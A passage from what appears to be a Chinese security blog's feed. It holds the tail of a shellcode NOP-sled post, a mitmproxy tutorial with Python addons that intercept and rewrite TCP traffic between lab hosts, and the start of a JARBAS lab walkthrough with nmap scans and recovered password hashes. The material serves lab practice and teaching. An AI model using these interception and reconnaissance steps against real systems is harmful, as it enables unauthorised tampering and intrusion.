inline">\(\frac{1}{16}\)</span></p><p>但是如果你在(0x401000,0x401010]填充了nop指令，并在其后接上你的real shellcode，那么函数返回的时候就会进入你的nop滑动条，最终执行到你的shellcode。</p><p>具体题目： <a href="https://lingze.xyz/pages/fecaf5/">rwctf2022 QLaaS</a>.</p>]]></content>
    
    
    <categories>
      
      <category>二进制安全</category>
      
      <category>shellcode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>二进制</tag>
      
      <tag>shellcode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mitmproxy拦截修改TCP数据包</title>
    <link href="/2023/10/23/blog0039-mitmproxy%E6%8B%A6%E6%88%AA%E4%BF%AE%E6%94%B9TCP%E6%95%B0%E6%8D%AE%E5%8C%85/"/>
    <url>/2023/10/23/blog0039-mitmproxy%E6%8B%A6%E6%88%AA%E4%BF%AE%E6%94%B9TCP%E6%95%B0%E6%8D%AE%E5%8C%85/</url>
    
    <content type="html"><![CDATA[<p>这个需求最开始的产生是某个项目的通信协议不是HTTP协议，如果需要在这个项目上完成相应的抓包拦截攻击，那么就需要在TCP层面拦截数据。</p><p>发现mitmproxy支持这个功能，但是相关的配置文章还是比较少的，因此在这里补充一下。</p><span id="more"></span><h2 id="功能说明">1、功能说明</h2><h3 id="网络拓扑">1.1、网络拓扑</h3><p>假设我们有主机A与主机B，以下对A主机和B主机进行说明。</p><ul><li>A主机运行服务ServiceA，运行端口为portA。</li><li>B主机运行服务ServiceB，运行端口为portB。</li></ul><p>实现功能如下：</p><ul><li>在A主机上拦截修改A主机访问ServiceB的流量以及B主机访问ServiceA的流量。</li><li>在B主机上拦截修改B主机访问ServiceA的流量以及A主机访问ServiceB的流量。</li></ul><p>以下给出演示说明的网络拓扑。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0039/image-20231021145019017.png" alt="image-20231021145019017" /></p><h3 id="工作模式">1.2、工作模式</h3><p>以下对mitmproxy的工作模式做具体说明，以A主机为例说明，B主机类似。</p><h4 id="socks5代理">1.2.1、socks5代理</h4><p>如果需要拦截A访问ServiceB的流量，可以在A主机上搭建socks5代理，在socks端口统一管理外出流量。</p><p>A访问ServiceB的流量模式如下<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0039/image-20231023004024587.png" alt="image-20231023004024587" /></p><h4 id="反向代理">1.2.2、反向代理</h4><p>如果需要在A主机上拦截B访问ServiceA的流量，可以在A主机上搭建反向代理，统一管理进入访问ServiceA的流量。</p><p>B访问ServiceA的流量模式如下：</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0039/image-20231021150151268.png" alt="image-20231021150151268" /></p><h2 id="配置与安装">2、配置与安装</h2><h3 id="配置说明">2.1、配置说明</h3><p>本项目基于Python3 + mitmproxy实现，其中对于版本有一定的要求。</p><ul><li>Python3 &gt;= 3.9.0</li><li>mitmporxy &gt;= 9.0.0</li></ul><p>mitmproxy在9.0及以上版本支持对于tcp协议的反向代理，也只有Python3.9及以上才支持高版本的mitmproxy。</p><h3 id="安装说明">2.2、安装说明</h3><p>Windows</p><p>安装命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">pip install mitmproxy<br></code></pre></td></tr></table></figure><p>查看命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mitmdump --version<br></code></pre></td></tr></table></figure><p>Linux</p><p>安装命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shel">pip install mitmproxy<br></code></pre></td></tr></table></figure><p>查看命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mitmdump --version<br></code></pre></td></tr></table></figure><h2 id="操作说明">3、操作说明</h2><h3 id="socks代理搭建">3.1、socks代理搭建</h3><p>使用如下命令搭建socks5服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mitmdump --mode socks5 --listen-port 1080 --scripts addons_socks5.py --set rawtcp=true<br></code></pre></td></tr></table></figure><p>说明上述参数:</p><ul><li>mode：mitmproxy的工作模式，此处指定为socks5</li><li>listen-port : 代理服务的端口</li><li>scripts: 相应的hook脚本，即后续对监听到的流量做处理的脚本</li><li>set: 设置参数，rawtcp必须设置为true，否则默认socks5代理只走http协议。</li></ul><p>测试相应的代理服务(以主机A为例)：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl --proxy socks5://127.0.0.1:1080 http://baidu.com<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0039/image-20231021151822118.png" alt="image-20231021151822118" /></p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0039/image-20231023004123121.png" alt="image-20231023004123121" /></p><h3 id="反向代理搭建">3.2、反向代理搭建</h3><p>使用如下命令搭建反向代理（主机A为例）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mitmdump --mode reverse:tcp://192.168.80.1:45367 --listen-port 7080 --scripts addons_reverse.py --set rawtcp=true<br></code></pre></td></tr></table></figure><p>说明上述参数:</p><ul><li>mode：mitmproxy的工作模式，此处指定为反向代理主机A 45367上的服务</li><li>listen-port : 反向代理的端口</li><li>scripts: 相应的hook脚本，即后续对监听到的流量做处理的脚本</li><li>set: 设置参数</li></ul><p>具体的有效性测试可以结合演示说明。</p><h3 id="addons与api">3.3、Addons与API</h3><p>在代理搭建部分，有一个参数叫script，主要用于加载插件。</p><p>这里给出一个插件示例</p><p><code>addons_socks5.py</code></p><p>注意事项：</p><ol type="1"><li>变量必须为addons，否则不会正确加载</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><span class="hljs-keyword">import</span> demo_socks5<br><br>addons = [<br>    demo_socks5.DemoOne()<br>]<br></code></pre></td></tr></table></figure><p><code>demo_socks5.py</code></p><p>注意事项：</p><ol type="1"><li>这里的hook API严格对应<a href="https://docs.mitmproxy.org/stable/api/events.html">官方文档</a>上的说明</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><span class="hljs-keyword">import</span> mitmproxy.tcp<br><span class="hljs-keyword">from</span> mitmproxy <span class="hljs-keyword">import</span> ctx<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DemoOne</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:</span><br>        self.num=<span class="hljs-number">0</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tcp_start</span>(<span class="hljs-params">self, flow: mitmproxy.tcp.TCPFlow</span>):</span><br>        ctx.log.info(<span class="hljs-string">&quot;TCP begin&quot;</span>)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tcp_message</span>(<span class="hljs-params">self, flow: mitmproxy.tcp.TCPFlow</span>):</span><br>        ctx.log.info((<span class="hljs-built_in">repr</span>(flow.messages[-<span class="hljs-number">1</span>])))<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tcp_end</span>(<span class="hljs-params">self, flow: mitmproxy.tcp.TCPFlow</span>):</span><br>        ctx.log.info(<span class="hljs-string">&quot;TCP end&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="演示说明">4、演示说明</h2><h3 id="socket通信">4.1、socket通信</h3><p>以下演示将会在A、B主机上使用socket+TCP完成通信，基础代码如下，根据不同的环境略有修改。</p><p>socket客户端</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> socks<br><br><span class="hljs-comment"># 设置socks全局代理</span><br><span class="hljs-comment"># socks.set_default_proxy(socks.SOCKS5, &quot;127.0.0.1&quot;, 1080)  </span><br><span class="hljs-comment"># socket.socket = socks.socksocket </span><br><br><span class="hljs-comment"># 创建一个 socket 对象</span><br>client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br><br><span class="hljs-comment"># 获取本地主机名</span><br>host = socket.gethostname()<br>port = <span class="hljs-number">45367</span><br><br><span class="hljs-comment"># 连接服务器</span><br>client_socket.connect((<span class="hljs-string">&quot;192.168.80.145&quot;</span>, port))<br><br><span class="hljs-comment"># 发送数据</span><br>message = <span class="hljs-string">&quot;I&#x27;m from &quot;</span> + socket.gethostname()<br>client_socket.send(message.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br><span class="hljs-comment"># 接收欢迎消息</span><br>message = client_socket.recv(<span class="hljs-number">1024</span>)<br><span class="hljs-built_in">print</span>(message.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br><span class="hljs-comment"># 关闭连接</span><br>client_socket.close()<br></code></pre></td></tr></table></figure><p>socket服务端</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><br><span class="hljs-comment"># 创建一个 socket 对象</span><br>server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br><br>port = <span class="hljs-number">45367</span><br><br><span class="hljs-comment"># 绑定主机和端口</span><br>server_socket.bind((<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port))<br><br><span class="hljs-comment"># 设置最大连接数，可以排队等待的客户端连接数</span><br>server_socket.listen(<span class="hljs-number">5</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-comment"># 建立客户端连接</span><br>    client_socket, addr = server_socket.accept()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Connected from : <span class="hljs-subst">&#123;addr&#125;</span>&#x27;</span>)<br><br>    <span class="hljs-comment"># 接受客户端信息</span><br>    data = client_socket.recv(<span class="hljs-number">1024</span>)<br>    received_message = data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;from client: <span class="hljs-subst">&#123;received_message&#125;</span>&#x27;</span>)<br><br>    <span class="hljs-comment"># 发送一条欢迎消息到客户端</span><br>    message = <span class="hljs-string">&#x27;Welcome to the server!&#x27;</span><br>    client_socket.send(message.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br>    <span class="hljs-comment"># 关闭连接</span><br>    client_socket.close()<br></code></pre></td></tr></table></figure><p>在主机A上正常访问ServiceB。</p><p>主机A</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0039/image-20231021161114637.png" alt="image-20231021161114637" /></p><p>主机B</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0039/image-20231021161131288.png" alt="image-20231021161131288" /></p><h3 id="主机a修改a访问serviceb的流量">4.2、主机A修改A访问ServiceB的流量</h3><p>A主机上编写插件，大致功能是实现将客户端发送的主机名修改为localhost</p><p><code>demo_socks5.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><span class="hljs-keyword">import</span> mitmproxy.tcp<br><span class="hljs-keyword">from</span> mitmproxy <span class="hljs-keyword">import</span> ctx<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DemoSocks5</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:</span><br>        self.num=<span class="hljs-number">0</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tcp_start</span>(<span class="hljs-params">self, flow: mitmproxy.tcp.TCPFlow</span>):</span><br>        ctx.log.info(<span class="hljs-string">&quot;TCP begin&quot;</span>)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tcp_message</span>(<span class="hljs-params">self, flow: mitmproxy.tcp.TCPFlow</span>):</span><br>        bytes_content : <span class="hljs-built_in">bytes</span> = flow.messages[-<span class="hljs-number">1</span>].content<br>        str_original_content : <span class="hljs-built_in">str</span> = bytes_content.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br>        pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;I&#x27;m from (.+)&quot;</span>)<br>        <br>        res = re.findall(pattern, str_original_content)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(res) != <span class="hljs-number">0</span>:<br>            <span class="hljs-comment"># ctx.log.info(res[0])</span><br>            edit_str_content = str_original_content.replace(res[<span class="hljs-number">0</span>], <span class="hljs-string">&#x27;localhost&#x27;</span>)<br>            flow.messages[-<span class="hljs-number">1</span>].content = edit_str_content.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>            ctx.log.info(<span class="hljs-string">&quot;&#123;&#125; -&gt; &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(str_original_content, edit_str_content))<br>        <span class="hljs-keyword">else</span>:<br>            ctx.log.info(str_original_content)<br>        <br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tcp_end</span>(<span class="hljs-params">self, flow: mitmproxy.tcp.TCPFlow</span>):</span><br>        ctx.log.info(<span class="hljs-string">&quot;TCP end&quot;</span>)<br></code></pre></td></tr></table></figure><p><code>addons_socks5.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><span class="hljs-keyword">import</span> demo_socks5<br><span class="hljs-keyword">from</span> mitmproxy <span class="hljs-keyword">import</span> ctx<br><span class="hljs-keyword">import</span> mitmproxy.tcp<br><span class="hljs-keyword">import</span> re<br><br>addons = [<br>    demo_socks5.DemoSocks5()<br>]<br></code></pre></td></tr></table></figure><p>在主机A上开启socks5代理，设置socks5代理端口为1080，启动插件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mitmdump --mode socks5 --listen-port 1080 --scripts addons_socks5.py --set rawtcp=true<br></code></pre></td></tr></table></figure><p>client.py中启动socks5代理。</p><p>主机A发送相应的信息，通过mitmdump日志可以看到相应的消息被拦截修改。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0039/image-20231021165724747.png" alt="image-20231021165724747" /></p><p>服务端接受到的数据发生了变化</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0039/image-20231023004201726.png" alt="image-20231023004201726" /></p><h3 id="主机b修改a访问serviceb的流量">4.3、主机B修改A访问ServiceB的流量</h3><p>在主机B编写插件</p><p><code>demo_reverse.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><span class="hljs-keyword">import</span> mitmproxy.tcp<br><span class="hljs-keyword">from</span> mitmproxy <span class="hljs-keyword">import</span> ctx<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DemoReverse</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:</span><br>        self.num=<span class="hljs-number">0</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tcp_start</span>(<span class="hljs-params">self, flow: mitmproxy.tcp.TCPFlow</span>):</span><br>        ctx.log.info(<span class="hljs-string">&quot;TCP begin&quot;</span>)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tcp_message</span>(<span class="hljs-params">self, flow: mitmproxy.tcp.TCPFlow</span>):</span><br>        bytes_content : <span class="hljs-built_in">bytes</span> = flow.messages[-<span class="hljs-number">1</span>].content<br>        str_original_content : <span class="hljs-built_in">str</span> = bytes_content.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br>        client_ip = flow.client_conn.address[<span class="hljs-number">0</span>]<br><br>        <span class="hljs-keyword">if</span> client_ip == <span class="hljs-string">&quot;192.168.80.1&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> flow.messages[-<span class="hljs-number">1</span>].from_client:<br>            <span class="hljs-comment"># ctx.log.info(&quot;&#123;&#125; and &#123;&#125;&quot;.format(client_ip, flow.messages[-1].from_client))</span><br>            ctx.log.info(<span class="hljs-string">&quot;&#123;&#125; -&gt; Evil behaviour detection!&quot;</span>.<span class="hljs-built_in">format</span>(str_original_content))<br>            flow.messages[-<span class="hljs-number">1</span>].content = <span class="hljs-string">b&#x27;Evil behaviour detection!&#x27;</span><br><br>        <br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tcp_end</span>(<span class="hljs-params">self, flow: mitmproxy.tcp.TCPFlow</span>):</span><br>        ctx.log.info(<span class="hljs-string">&quot;TCP end&quot;</span>)<br></code></pre></td></tr></table></figure><p><code>addons_reverse.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><span class="hljs-keyword">import</span> demo_reverse<br><span class="hljs-keyword">from</span> mitmproxy <span class="hljs-keyword">import</span> ctx<br><span class="hljs-keyword">import</span> mitmproxy.tcp<br><span class="hljs-keyword">import</span> re<br><br>addons = [<br>    demo_reverse.DemoRerverse(),<br>]<br></code></pre></td></tr></table></figure><p>在主机B上开启反向代理，设置反向代理端口为7080，启动插件</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">mitmdump <span class="hljs-params">--mode</span> reverse<span class="hljs-function">:tcp</span>:<span class="hljs-string">//192.168.80.145</span><span class="hljs-function">:45367</span> <span class="hljs-params">--listen-port</span> 7080 <span class="hljs-params">--scripts</span> addons_reverse.py <span class="hljs-params">--set</span> rawtcp=<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0039/image-20231021171328976.png" alt="image-20231021171328976" /></p><p>主机A访问ServiceB</p><p>主机A：</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0039/image-20231021173544890.png" alt="image-20231021173544890" /></p><p>主机A的socks5代理</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0039/image-20231021173456256.png" alt="image-20231021173456256" /></p><p>主机B的反向代理日志：</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0039/image-20231021173515615.png" alt="image-20231021173515615" /></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>TCP/IP</tag>
      
      <tag>mitmproxy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>靶场笔记-JARBAS</title>
    <link href="/2023/10/22/blog0038-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0-JARBAS/"/>
    <url>/2023/10/22/blog0038-%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0-JARBAS/</url>
    
    <content type="html"><![CDATA[<p>本篇涉及Jenkins任意命令执行，Crontab提权</p><span id="more"></span><h2 id="主机扫描">主机扫描</h2><p>找到目标主机192.168.80.147</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap -sn 192.168.80.0/24<br>Starting Nmap 7.91 ( https://nmap.org ) at 2023-10-22 06:41 EDT<br>Nmap scan report for 192.168.80.2<br>Host is up (0.00057s latency).<br>Nmap scan report for 192.168.80.128<br>Host is up (0.00086s latency).<br>Nmap scan report for 192.168.80.147<br>Host is up (0.0022s latency).<br>Nmap done: 256 IP addresses (3 hosts up) scanned in 3.12 seconds<br></code></pre></td></tr></table></figure><h2 id="端口扫描">端口扫描</h2><h3 id="tcp扫描">TCP扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo nmap -sT --min-rate 10000 -p- 192.168.80.147 -oA nmapscan/ports<br>Starting Nmap 7.91 ( https://nmap.org ) at 2023-10-22 06:42 EDT<br>Nmap scan report for 192.168.80.147<br>Host is up (0.00025s latency).<br>Not shown: 65531 closed ports<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>3306/tcp open  mysql<br>8080/tcp open  http-proxy<br>MAC Address: 00:0C:29:62:89:29 (VMware)<br><br>Nmap done: 1 IP address (1 host up) scanned in 2.40 seconds<br></code></pre></td></tr></table></figure><p>获取更详细的版本信息</p><ol type="1"><li>Web端是PHP5.6</li><li>MariaDB存在未授权</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell">Starting Nmap 7.91 ( https://nmap.org ) at 2023-10-22 06:45 EDT<br>Nmap scan report for 192.168.80.147<br>Host is up (0.00028s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 28:bc:49:3c:6c:43:29:57:3c:b8:85:9a:6d:3c:16:3f (RSA)<br>|   256 a0:1b:90:2c:da:79:eb:8f:3b:14:de:bb:3f:d2:e7:3f (ECDSA)<br>|_  256 57:72:08:54:b7:56:ff:c3:e6:16:6f:97:cf:ae:7f:76 (ED25519)<br>80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16<br>|_http-title: Jarbas - O Seu Mordomo Virtual!<br>3306/tcp open  mysql   MariaDB (unauthorized)<br>8080/tcp open  http    Jetty 9.4.z-SNAPSHOT<br>| http-robots.txt: 1 disallowed entry <br>|_/<br>|_http-server-header: Jetty(9.4.z-SNAPSHOT)<br>|_http-title: Site doesn&#x27;t have a title (text/html;charset=utf-8).<br>MAC Address: 00:0C:29:62:89:29 (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device type: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 8.63 seconds<br><br></code></pre></td></tr></table></figure><h3 id="udp扫描">UDP扫描</h3><p>扫描最热门的20个端口，没什么收获</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nmap -sU --top-ports <span class="hljs-number">20</span> <span class="hljs-number">192.168.80.147</span> -oA nmapscan/udp<br></code></pre></td></tr></table></figure><h3 id="漏洞扫描">漏洞扫描</h3><p>使用漏洞脚本扫描，也没什么收获</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo nmap --script=vuln -p22,80,3306,8080 192.168.80.147 -oA nmapscan/vuln<br></code></pre></td></tr></table></figure><h2 id="mysql">MySQL</h2><p>虽然提示存在未授权漏洞，但是本身设置拒绝了远程连接，因此尝试失败。</p><h2 id="web服务">Web服务</h2><p>访问80端口Web服务，是一个国外的网站。8080端口运行的是jekins服务。</p><h3 id="目录扫描">目录扫描</h3><p>查看前端发现这里不存在什么代码服务，基本都是定位到webarchive的服务，感觉是查不到什么东西。</p><p>再次使用dirsearch发现存在一个access.html，存放加密的信息。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tiago</span>:<span class="hljs-number">5978</span>a<span class="hljs-number">63</span>b<span class="hljs-number">4654</span>c<span class="hljs-number">73</span>c<span class="hljs-number">60</span>fa<span class="hljs-number">24</span>f<span class="hljs-number">836386</span>d<span class="hljs-number">87</span><br><span class="hljs-attribute">trindade</span>:f<span class="hljs-number">463</span>f<span class="hljs-number">63616</span>cb<span class="hljs-number">3</span>f<span class="hljs-number">1</span>e<span class="hljs-number">81</span>ce<span class="hljs-number">46</span>b<span class="hljs-number">39</span>f<span class="hljs-number">882</span>fd<span 